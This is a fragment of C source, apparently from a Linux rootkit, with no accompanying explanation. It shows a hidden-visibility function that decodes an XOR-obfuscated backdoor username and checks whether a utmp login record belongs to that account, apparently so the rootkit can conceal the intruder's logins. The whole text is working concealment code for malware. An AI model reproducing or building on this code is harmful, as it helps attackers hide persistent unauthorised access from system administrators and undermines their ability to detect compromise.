...
int __attribute((visibility("hidden"))) magicutmp(const void *utarget){
    if(!utarget) return 0;
    const struct utmp *ut = (const struct utmp*)utarget;
    char *pamname;
    size_t namelen;
    int s;
    pamname = xordup(BDUSERNAME);
    if(!pamname) return 0;
    namelen = strlen(pamname);
    s = strncmp(pamname, ut->ut_user, namelen);
    clean(pamname);
    return s == 0;
}
